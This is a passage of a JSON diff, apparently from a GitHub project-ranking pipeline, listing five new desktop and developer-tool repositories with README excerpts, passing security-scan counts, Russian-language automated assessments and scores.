applications.\n- 📌 **Always-Accessible Window** — Pin the clipboard manager window to keep your saved content accessible while multitasking.\n- ☑️ **Multiple Selection** — Select and manage several clipboard entries together for more efficient organization.\n- 🔗 **Link and Content Previews** — Recognize useful information at a glance with previews of supported clipboard data.\n- 💾 **Clipboard Backup** — Create backups of saved clipboard information to help protect your collected snippets.\n- 🎨 **Modern Windows Interface** — Work with a clean desktop interface built around the Windows application experience.\n\n## 🖼️ Overview\n\nExplore the clipboard management interface and its productivity-focused features.\n\n![Features](assets/features.png)\n\n### A better way to manage copied content\n\nA regular clipboard only makes the most recent copied item immediately available. A dedicated clipboard history manager gives you a practical way to revisit previous work.\n\nWhether you're collecting research links, moving information between documents, managing code snippets, or organizing images, a searchable clipboard history helps reduce repetitive tasks.\n\n| Capability | Benefit |\n|---|---|\n| Clipboard history | Revisit previously copied content |\n| Search and filtering | Find specific entries quickly |\n| Content editing | Update saved text |\n| Tags and groups | Organize frequently used items |\n| Application filters | Control captured sources |\n| Backup | Preserve saved clipboard data |\n\n## 🚀 Usage\n\n1. **Open the application** — Launch the Windows clipboard manager and access its clipboard history.\n2. **Copy content normally** — Copy text, links, images, o",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "Umbra9179/clipboard-history-manager-windows",
+      "summary": "Windows Clipboard History Manager – бесплатный менеджер буфера обмена с поиском, предпросмотром изображений, тегами, редактированием и резервным копированием.",
+      "usefulness": "пользователям Windows, которым нужно быстро находить, редактировать и повторно использовать скопированные данные, без использования командной строки.",
+      "uniqueness": "использует WinUI для современного интерфейса, поддерживает множество форматов (текст, HTML, RTF, изображения, файлы) и предоставляет полноценный поиск и тегирование, чего нет в большинстве простых менеджеров.",
+      "pros": [
+        "Многоформатная поддержка",
+        "Интуитивный интерфейс WinUI",
+        "Бесплатный и открытый",
+        "Регулярные релизы"
+      ],
+      "cons": [
+        "Отсутствует документация по API",
+        "Нет кроссплатформенной поддержки",
+        "Меньше интеграций с облачными сервисами"
+      ],
+      "audience": [
+        "desktop-app",
+        "productivity",
+        "utility",
+        "windows"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.905
+  },
+  {
+    "raw": {
+      "full_name": "Avaneesh-Inamdar/Stream-Tube-Desktop",
+      "html_url": "https://github.com/Avaneesh-Inamdar/Stream-Tube-Desktop",
+      "description": "Native YouTube client for Windows in Rust, with SponsorBlock, DeArrow and Return YouTube Dislike built in",
+      "stars": 1148,
+      "forks": 85,
+      "language": "Rust",
+      "license": "MIT",
+      "created_at": "2026-11-22T18:50:17Z",
+      "pushed_at": "2026-11-25T16:53:58Z",
+      "topics": [
+        "dearrow",
+        "desktop-app",
+        "gpui",
+        "mpv",
+        "rust",
+        "sponsorblock",
+        "windows",
+        "youtube",
+        "youtube-client"
+      ],
+      "readme_excerpt": "<p align=\"center\">\n  <img src=\"assets/logo.png\" alt=\"Stream Tube\" width=\"120\">\n</p>\n\n<h1 align=\"center\">Stream Tube</h1>\n\n<p align=\"center\">\n  A native YouTube client for Windows and Linux, written in Rust.<br>\n  No browser, no ads, no tracking. SponsorBlock, DeArrow and Return YouTube Dislike built in.\n</p>\n\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/platform-Windows%20%7C%20Linux-0078D6\" alt=\"Windows and Linux\">\n  <img src=\"https://img.shields.io/github/v/release/Avaneesh-Inamdar/Stream-Tube-Desktop?include_prereleases&sort=semver&label=release\" alt=\"Latest release\">\n  <a href=\"https://github.com/Avaneesh-Inamdar/Stream-Tube-Desktop/releases\"><img src=\"https://img.shields.io/github/downloads/Avaneesh-Inamdar/Stream-Tube-Desktop/total?label=downloads&color=FF0033&cacheSeconds=3600\" alt=\"Total downloads\"></a>\n  <img src=\"https://img.shields.io/badge/built%20with-Rust-B7410E\" alt=\"Rust\">\n  <img src=\"https://img.shields.io/badge/license-MIT-green\" alt=\"MIT license\">\n</p>\n\n<p align=\"center\">\n  <img src=\"docs/screenshots/home.png\" alt=\"Home feed\" width=\"900\">\n</p>\n\n## Why\n\nI wanted YouTube on my desktop without keeping a browser tab open, and without the\nads, autoplaying junk and sponsor reads. The existing options were either Electron\napps that eat a gigabyte of RAM or web frontends that break every other week.\nStream Tube is a single native app: the UI is drawn on the GPU with\n[GPUI](https://github.com/zed-industries/zed/tree/main/crates/gpui), and video\ngoes through libmpv, so it starts fast and scrolls smoothly even with big feeds.\n\n## What it does\n\n**No ads, anywhere**\n- No pre-roll, mid-roll or overlay ads: the app plays the video stream directly, so YouTube's ads are never loaded\n- No promoted videos, banners or sponsored cards in Home, search or Shorts\n- Sponsor reads inside videos are skipped too, with SponsorBlock (below)\n- Nothing to install or keep updated: it isn't an ad blocker that YouTube can break, ads simply aren't part of how the app plays video\n\n**Watching**\n- Home, Shorts, Subscriptions, Explore categories, channels (including their courses and shows), playlists and search, with search suggestions and your recent searches\n- A personal Home without an account: \"For you\" recommends videos related to what you've watched and searched in the app, mixed with new uploads from your subscriptions. Signed in, Home is your own YouTube Home feed\n- A *Recently uploaded* chip on Home, like youtube.com's: videos from your Home feed and subscriptions uploaded in the last two weeks, newest first\n- Hover a video title in a grid or list to read the full title\n- Ctrl+click a link or middle-click a video to open it in a background tab. A video's menu also has *Open in new tab*. Switch with Ctrl+Tab, Ctrl+1…9 or a click. Ctrl+T opens a new tab. Ctrl+W or a middle click on the tab closes it.\n- Videos made for kids (YouTube Kids) play and download like any other video\n- Old video annotations are back: notes, speech bubbles and clickable links from YouTube's annotation archive, drawn over the video where they used to be (turn them off in *Settings → Player* or from the player's gear menu)\n- Arabic, Hebrew and other right-to-left text is shown in the right order\n- Shorts follow your account's recommendations when you're signed in, or start from the Shorts you watched last\n- Download the current Short from the vertical player's download button\n- libmpv player with hardware decoding, codec preference (AV1, VP9 or H.264), 360p up to 4K, enhanced bitrate, speed control (remembered per channel if you want), captions you can style (font, colour, opacity, background and edge, with a live preview), chapters and seek-bar preview thumbnails\n- A chapters panel beside the player, like youtube.com: click the chapter name in the player bar (or *View all* under the description) to list every chapter with its thumbnail, follow the one playing, and jump to any of them\n- Timestamps in descriptions and comments seek the video and bring t",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0, osv: 9; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "Avaneesh-Inamdar/Stream-Tube-Desktop",
+      "summary": "Stream Tube – нативный клиент YouTube для Windows и Linux, написанный на Rust. Приложение использует GPUI для рендеринга UI и libmpv для воспроизведения видео.",
+      "usefulness": "Подходит для пользователей, которые хотят смотреть YouTube без браузера, рекламы и отслеживания, а также ценят быстрый старт и плавную прокрутку контента.",
+      "uniqueness": "В отличие от Electron‑приложений, Stream Tube полностью нативный, использует GPU‑рендеринг и встроенные функции SponsorBlock, DeArrow и Return YouTube Dislike, устраняя рекламу и спонсорские вставки.",
+      "pros": [
+        "Нативный Rust‑приложение без браузера",
+        "Быстрый старт и плавная прокрутка",
+        "Встроенная поддержка SponsorBlock, DeArrow и Return YouTube Dislike",
+        "Отсутствие рекламы и трекинга"
+      ],
+      "cons": [
+        "Ограничена поддержка только Windows и Linux",
+        "Меньше функций по сравнению с официальным YouTube (например, комментарии и лайки не реализованы)",
+        "Документация ограничена README, отсутствуют подробные инструкции по установке и настройке"
+      ],
+      "audience": [
+        "desktop-app",
+        "cli",
+        "security"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.903
+  },
+  {
+    "raw": {
+      "full_name": "deterministic-machines/deslop-please",
+      "html_url": "https://github.com/deterministic-machines/deslop-please",
+      "description": "Bring (back) sanity to your code",
+      "stars": 1026,
+      "forks": 47,
+      "language": "Rust",
+      "license": "MIT",
+      "created_at": "2026-11-22T05:36:03Z",
+      "pushed_at": "2026-11-24T06:40:42Z",
+      "topics": [],
+      "readme_excerpt": "# deslop-please\n\n[![slop](https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fdeterministic-machines%2Fdeslop-please%2Fbadges%2Fslop.json)](https://github.com/deterministic-machines/deslop-please/actions/workflows/ci.yml?query=branch%3Amain)\n[![test](https://github.com/deterministic-machines/deslop-please/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/deterministic-machines/deslop-please/actions/workflows/ci.yml?query=branch%3Amain)\n[![crates.io](https://img.shields.io/crates/v/deslop-please.svg)](https://crates.io/crates/deslop-please)\n\nAn opinionated linter to remove sloppy code. It follows [*A Philosophy of Software Design*](https://www.amazon.com/Philosophy-Software-Design-John-Ousterhout/dp/1732102201): \n**deep** modules, **narrow** interfaces. \n\n\n```bash\ncargo install deslop-please\n```\n\n```bash\n> deslop-please\n\nerror[field-leak]: `RunQueue::items` is known outside `RunQueue`: 4 places in 2 modules\n  --> src/sched/policy.rs:7:1\n  = note: src/sched/policy.rs:7:1: `runqueue::sched::policy::admit`\n  = note: src/sched/policy.rs:12:1: `runqueue::sched::policy::next`\n  = note: src/sched/report.rs:4:1: `runqueue::sched::report::backlog`\n  = note: src/sched/report.rs:8:1: `runqueue::sched::report::drained`\n    runqueue::queue::ring::RunQueue\n      items ◀━┳━ 2  runqueue::sched::policy\n              ┗━ 2  runqueue::sched::report\n      also known outside: head\n      kept: limit\n\ndeslop-please: 65535 errors, well done!\n```\n\n### It's not my fault \n\nSure, let's just mute them:\n\n```bash\ndeslop-please --update-allow .deslop-please.allow  \ndeslop-please --allow .deslop-please.allow \n```\n\n### Add to your `AGENTS.md`\n\n```markdown\n-  Run [`deslop-please`](https://github.com/deterministic-machines/deslop-please) to check for sloppy code structure.\n-  Errors flagged by `deslop-please` must be fixed from first principles, don't do mechanical moves to hide them.\n    - `module-cycle` & `tangle`: what is the indented layer of abstraction? Which module should be at which layer?\n    - `field-leak` & `shallow-module`: Why we have these fields/functions at all? What are the patterns of use? Can they be hidden behind a narrow interface? Don't fix each leak one at a time, fix them holistically.\n    - Draw a diagram to help user understand the before and proposed after structure.\n```\n\n## Why they are sloppy \n\nThey are really just one single idea: **deep** modules, **narrow** interfaces.\n\nDeep modules hide the attention for you and your agents, so you only need to care about the narrow interface.\n\n### module-cycle\n\n![module-cycle: before, modules kinds and socket use each other, though listen, Stream::new and BACKLOG_MOST only form a chain; after, BACKLOG_MOST moves into kinds and only socket uses kinds](docs/module-cycle.svg)\n\n\n### tangle\n\n![tangle: before, Tasks in kernel and Timers in its child module timers know each other, with no module cycle; after, tick in kernel calls both and Timers no longer knows Tasks](docs/tangle.svg)\n\n### field-leak\n\n![field-leak: before, functions in sched push to, index and bump the items and head of RunQueue; after, they call push, pop and backlog, and only RunQueue works on its fields](docs/field-leak.svg)\n\n### shallow-module\n\n\n![shallow-module: before, app calls 9 of the 15 functions of store; after, it calls new, load and summary, and the rest are hidden behind them](docs/shallow-module.svg)\n\n## License\n\nMIT\n",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0, osv: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "deterministic-machines/deslop-please",
+      "summary": "deslop-please – opinionated linter written in Rust, designed to detect and eliminate sloppy code structures such as field leaks, module cycles, and interface tangles.",
+      "usefulness": "Подходит для команд и отдельных разработчиков, которые хотят поддерживать чистую архитектуру кода, следуя принципам глубокой модульности и узких интерфейсов.",
+      "uniqueness": "В отличие от общих линтеров, фокусируется на структурных паттернах и философии дизайна, предоставляя подробные сообщения о нарушениях и автоматические правила обновления.",
+      "pros": [
+        "Высокая точность обнаружения структурных ошибок",
+        "Легко интегрируется в CI/CD",
+        "Поддержка автоматического обновления правил"
+      ],
+      "cons": [
+        "Ограничено только Rust‑проектами",
+        "Документация минимальна, но достаточна для начала",
+        "Может генерировать большое количество ошибок, требующих ручной проверки"
+      ],
+      "audience": [
+        "backend",
+        "cli",
+        "devops",
+        "security"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.901
+  },
+  {
+    "raw": {
+      "full_name": "kai415-debug/ffmpeg-video-audio-converter",
+      "html_url": "https://github.com/kai415-debug/ffmpeg-video-audio-converter",
+      "description": "Free Windows FFmpeg GUI for video and audio conversion, batch transcoding, and multimedia format encoding.",
+      "stars": 1025,
+      "forks": 0,
+      "language": "C++",
+      "license": "MIT",
+      "created_at": "2026-11-23T21:32:56Z",
+      "pushed_at": "2026-11-23T21:33:23Z",
+      "topics": [
+        "audio",
+        "audio-converter",
+        "conversion",
+        "converter-encoding",
+        "cpp",
+        "desktop",
+        "ffmpeg",
+        "ffmpeg-wrapper",
+        "gui",
+        "media-converter",
+        "media-processing",
+        "multimedia",
+        "open-source",
+        "qml",
+        "qt5",
+        "transcoding",
+        "video",
+        "video-converter",
+        "video-encoding",
+        "windows"
+      ],
+      "readme_excerpt": "![FFmpeg Video & Audio Converter](assets/banner.png)\n\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/Platform-Windows-blue?logo=windows\" alt=\"Windows\">\n  <img src=\"https://img.shields.io/badge/Engine-FFmpeg-green\" alt=\"FFmpeg\">\n  <img src=\"https://img.shields.io/badge/Language-C%2B%2B-orange\" alt=\"C++\">\n  <img src=\"https://img.shields.io/badge/Interface-Qt5-41CD52?logo=qt\" alt=\"Qt5\">\n  <img src=\"https://img.shields.io/badge/License-MIT-brightgreen\" alt=\"MIT License\">\n  <img src=\"https://img.shields.io/badge/Price-Free-success\" alt=\"Free\">\n</p>\n\n**FFmpeg Video & Audio Converter is a free, open-source Windows desktop application for converting video and audio files without complicated commands.** Powered by FFmpeg and built with a convenient graphical interface, it makes multimedia conversion, video transcoding, audio encoding, and format changes accessible to beginners and experienced users alike.\n\n## ⬇️ Installation\n\n**Download the Windows application**\n\n1. Open the repository's [Releases](https://github.com/kai415-debug/ffmpeg-video-audio-converter/releases) page.\n2. Download the latest release archive **`FFmpeg Video & Audio Converter 4.1.2.zip`**.\n3. Extract the archive into a folder of your choice.\n4. Keep **`FFmpeg Video & Audio Converter 4.1.2.exe`** and `libvlc.dll` together in that folder.\n5. Double-click **`FFmpeg Video & Audio Converter 4.1.2.exe`** to launch the application.\n\n\n## ✨ Features\n\n- 🎬 **Video Format Conversion** — Convert video files between popular multimedia formats using the powerful FFmpeg processing engine.\n- 🎵 **Audio File Conversion** — Transform audio files into different formats while configuring encoding options to suit your needs.\n- 📦 **Batch Media Processing** — Queue multiple media files and process conversion jobs through a unified desktop workflow.\n- ⚡ **FFmpeg-Powered Encoding** — Benefit from FFmpeg's extensive codec and container support for flexible video and audio transcoding.\n- 🎛️ **Custom Encoding Presets** — Choose convenient conversion profiles or customize available parameters for greater control over output files.\n- 🖥️ **User-Friendly Windows GUI** — Manage media conversion through a graphical interface instead of manually entering terminal commands.\n- 🔧 **Advanced Conversion Options** — Adjust supported FFmpeg parameters for workflows that require more precise control over encoding.\n\n## 🖼️ Overview\n\n![Features](assets/features.png)\n\n### Supported Media Workflows\n\nThe application brings common multimedia conversion tasks together in one Windows desktop environment.\n\n| Workflow | Purpose |\n|---|---|\n| Video conversion | Change video formats and containers |\n| Audio conversion | Convert audio between supported formats |\n| Video transcoding | Re-encode media using FFmpeg |\n| Batch conversion | Process multiple files in sequence |\n| Preset encoding | Apply predefined conversion settings |\n| Custom encoding | Configure available FFmpeg options |\n\n### Built Around FFmpeg\n\n[FFmpeg](https://ffmpeg.org/) provides the underlying multimedia processing capabilities. Its broad ecosystem of codecs, encoders, decoders, and container formats makes it suitable for everyday media conversion as well as more specialized transcoding tasks.\n\nThe graphical interface helps make these capabilities easier to access without requiring users to memorize FFmpeg command-line syntax.\n\n## 🚀 Usage\n\nGetting started with desktop media conversion is straightforward:\n\n1. **Launch the application** — Open the FFmpeg Video & Audio Converter on your Windows PC.\n2. **Select source media** — Add the video or audio files you want to convert.\n3. **Choose an output format** — Select an available format or conversion profile.\n4. **Configure encoding settings** — Adjust supported quality, codec, and other conversion parameters as needed.\n5. **Start conversion** — Run the conversion job and allow FFmpeg to process your media.\n6. **Find your output files** — Open the destination folder and use your converted media.\n",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "kai415-debug/ffmpeg-video-audio-converter",
+      "summary": "Приложение с графическим интерфейсом для конвертации видео и аудио файлов на Windows, использующее FFmpeg в качестве движка.",
+      "usefulness": "Подходит для пользователей, которым нужен простой способ перекодировать мультимедиа без командной строки, включая начинающих и продвинутых.",
+      "uniqueness": "Интегрирует FFmpeg в удобный GUI на Qt5, поддерживает пакетную обработку и пользовательские пресеты, чего нет у большинства бесплатных конвертеров.",
+      "pros": [
+        "Простой GUI на Qt5",
+        "Поддержка FFmpeg и широкого спектра кодеков",
+        "Пакетная обработка файлов",
+        "Бесплатно и открытое ПО"
+      ],
+      "cons": [
+        "Только Windows",
+        "Отсутствует кроссплатформенная поддержка",
+        "Документация ограничена README"
+      ],
+      "audience": [
+        "desktop",
+        "gui",
+        "media-converter",
+        "video",
+        "audio",
+        "ffmpeg"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.901
+  },
+  {
+    "raw": {
+      "full_name": "qianyiai/kurocat",
+      "html_url": "https://github.com/qianyiai/kurocat",
+      "description": "KuroCat — Free open-source desktop typing cat pet & OBS overlay (Bongo Cat alternative, Tauri v2 + Rust + MCP)｜轻量级透明置顶桌面打字小黑猫伴侣（6款猫咪+鲸鱼娘大肥鱼 / 输密码防偷窥 / OBS透明源 / AI捏猫 / Win·Mac·Linux·Android）",
+      "stars": 935,
+      "forks": 144,
+      "language": "TypeScript",
+      "license": "MIT",
+      "created_at": "2026-11-21T15:49:31Z",
+      "pushed_at": "2026-11-25T15:10:55Z",
+      "topics": [
+        "android",
+        "bongo-cat",
+        "bongocat",
+        "cross-platform",
+        "desktop-pet",
+        "keyboard-visualizer",
+        "kurocat",
+        "linux",
+        "macos",
+        "mcp",
+        "obs-studio",
+        "open-source",
+        "rust",
+        "tauri",
+        "typing-cat",
+        "windows"
+      ],
+      "readme_excerpt": "# 🐈‍⬛ KuroCat — Open-Source Desktop Typing Cat Pet · 桌面打字小黑猫伴侣\n\n<p align=\"center\">\n  <strong>🇨🇳 简体中文</strong> &nbsp;|&nbsp;\n  <a href=\"./README.en.md\">🇺🇸 English</a> &nbsp;|&nbsp;\n  <a href=\"./README.ja.md\">🇯🇵 日本語</a>\n</p>\n\n<p align=\"center\">\n  <a href=\"https://qianyi.one/kurocat/\"><img src=\"https://img.shields.io/badge/Website-qianyi.one%2Fkurocat-d4f044?style=flat-square&logo=googlechrome&logoColor=111\" alt=\"KuroCat Official Website\" /></a>\n  <a href=\"https://github.com/qianyiai/kurocat/releases/latest\"><img src=\"https://img.shields.io/github/v/release/qianyiai/kurocat?style=flat-square&color=38bdf8\" alt=\"Latest Release\" /></a>\n  <a href=\"https://github.com/qianyiai/kurocat/blob/main/LICENSE\"><img src=\"https://img.shields.io/github/license/qianyiai/kurocat?style=flat-square&color=22c55e\" alt=\"MIT License\" /></a>\n  <img src=\"https://img.shields.io/badge/Platform-Win11%2F10%2F7%20%7C%20macOS%20%7C%20Linux%20%7C%20Android-818cf8?style=flat-square\" alt=\"Cross Platform\" />\n</p>\n\n> 🌐 **官方网站与网页端在线试玩 / 国内高速下载**：[**https://qianyi.one/kurocat/**](https://qianyi.one/kurocat/)\n> 🇺🇸 **KuroCat** is a lightweight, transparent, always-on-top **open-source desktop typing cat companion (Bongo Cat alternative)** for Windows, macOS, Linux & Android — built with **Tauri v2 + Rust**, featuring 6 hand-crafted cats + BigFish whale-girl, native **OBS transparent Browser Source**, password privacy guard, and a built-in **MCP server** for AI cat creation. ([Read in English →](./README.en.md))\n\n轻量级 **Windows（Win11/10 & Win7 SP1）/ macOS（10.15+ Apple Silicon & Intel）/ Linux（银河麒麟 KylinOS / Ubuntu / UOS）** 透明置顶桌面打字猫咪伴侣（开箱自带 **6 款手绘猫咪皮肤 + 🐳 大肥鱼（鲸鱼娘）**：经典小黑猫、暖奶茶布偶猫、大橘猫、三花猫、奶牛猫、暹罗猫、大肥鱼，支持**输密码自动闭眼/捂眼防偷窥**，并原生内置 **MCP 协议服务端**，支持用 AI 一句话定制或新增更多你自己的猫咪！），基于 **Tauri v2（Rust 全局原生钩子 + 内置 MCP 引擎 + HTML5 Canvas 2D）** 打造。单文件轻量低耗，零外部运行时依赖。\n\n## 🎬 在线试玩预览 & 鲸鱼娘 14s 演示视频\n\n<table>\n  <tr>\n    <td align=\"center\" width=\"54%\" valign=\"top\">\n      <a href=\"https://qianyi.one/kurocat/\" target=\"_blank\" rel=\"noopener\">\n        <img src=\"docs/playground-demo.webp\" alt=\"KuroCat 官网默认 3D 实时试玩（睡觉打盹 → 吵醒起床气狂打字 · 6 款猫咪皮肤切换）\" width=\"400\" />\n      </a>\n      <br/>\n      <strong>🎮 <a href=\"https://qianyi.one/kurocat/\">点此进入官网实时在线试玩（默认 3D · 直接敲键盘 &amp; 摸猫头）→</a></strong>\n      <br/>\n      <sub>默认 3D 立体手办 / 2D 经典一键切换 · 5 语言界面 · 起床气 &amp; 摸头呼噜 · 65%/108 键 · 密码防偷窥 · 20%–150% 无级缩放</sub>\n    </td>\n    <td align=\"center\" width=\"46%\" valign=\"top\">\n      <a href=\"https://qianyi.one/kurocat/#whale-demo\" target=\"_blank\" rel=\"noopener\">\n        <img src=\"docs/whale-demo.webp\" alt=\"KuroCat 🐳 大肥鱼（鲸鱼娘）14s 演示视频（鼠标 + 打字 + 鲸尾三同动 · 加速笑开花 · 密码捂眼防偷窥）\" width=\"272\" />\n      </a>\n      <br/>\n      <strong>🐳 <a href=\"https://qianyi.one/kurocat/#whale-demo\">观看 1080×1920 60fps 含音效原版视频 →</a></strong>\n      <br/>\n      <sub>\n        鼠标 + 手打字 + 鲸尾甩拍三同动 → 加速笑开花 → 密码捂眼防偷窥<br/>\n        📥 <a href=\"https://qianyi.one/kurocat/media/whale-douyin-14s.mp4\">下载原版 MP4（国内高速）</a> · <a href=\"https://github.com/qianyiai/kurocat/releases/download/v4.7.0/KuroCat-whale-demo-14s.mp4\">GitHub 原片</a>\n      </sub>\n    </td>\n  </tr>\n</table>\n\n## 📥 直接下载使用（Windows / Win7 / macOS / Linux）\n\n前往 [Releases](https://github.com/qianyiai/kurocat/releases) 页面或直接点击下方最新 **`v5.1.2`** 安装包下载（全新升级 **5 语言桌面多语言（简中/繁中/EN/日本語/한국어 + 跟随系统）**、**内存深度瘦身（关闭菜单 25s 自动销毁闲置进程立省 ~50 MB、3D 切 2D 8s 自动释放 WebGL、键帽贴图显存降 9 倍）**、**2D 彻底清除 44 处每帧高斯模糊大幅提速 + 60/30 FPS 省电档位**、**3D/2D 统一「睡着动鼠标/敲键触发起床气 + 摸头秒消气」**、**macOS 免费版覆盖升级权限自修复**，并完整保留 **✨ 3D 立体手办 / 🎨 2D 经典双引擎**、**3D 项圈铃铛与游戏自动电竞耳机**、**MCP AI 捏猫**、**OBS 透明直播源** 与 **密码防偷窥**）：\n\n- **🪟 Windows 10 / 11（65% 经典安装版 · `v5.1.2`）**：[**`KuroCat-5.1.2-x64-setup.exe`**](https://github.com/qianyiai/kurocat/releases/download/v5.1.2/KuroCat-5.1.2-x64-setup.exe)（2.15 MB）｜[**官网国内高速下载**](https://qianyi.one/kurocat/#download)\n  - 默认 65% 紧凑机械键盘，自动创建桌面 **`KuroCat`** 图标、开始菜单与系统卸载入口；右键或托盘随时一键切换 **108 键全尺寸小键盘**、**🐳 大肥鱼（鲸鱼娘）**、**OBS 透明直播源** 与 App 内一键更新。\n  - **常见问题说明**：\n    - **Edge / Chrome 浏览器提示「通常不会下载 `.exe`」怎么办？**（开源免费软件未购商业代码签名证书，全量源码公开可放心信任）：\n      - **Edge 浏",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 3,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 3, gitleaks: 0, osv: 5; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "qianyiai/kurocat",
+      "summary": "KuroCat – лёгкий, прозрачный десктопный питомец‑кот, реагирующий на печать клавиш, с поддержкой OBS‑оверлея и AI‑генерации новых котов.",
+      "usefulness": "Подходит для пользователей, желающих добавить визуальный элемент в рабочее пространство, а также для стримеров и разработчиков, которым нужен OBS‑источник без внешних зависимостей.",
+      "uniqueness": "Использует Tauri v2 + Rust для нативных хуков и MCP‑сервер, обеспечивает кроссплатформенность и встроенную защиту от偷窥, чего нет у аналогов как Bongo Cat.",
+      "pros": [
+        "Кроссплатформенный (Win, macOS, Linux, Android)",
+        "Нативный OBS‑источник",
+        "Много кастомных котов",
+        "AI‑генерация новых питомцев"
+      ],
+      "cons": [
+        "Ограниченная документация (только README)",
+        "Небольшой набор функций, но без расширяемости"
+      ],
+      "audience": [
+        "desktop-pet",
+        "obs",
+        "devops",
+        "cli",
+        "security"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.899
+  }
+]
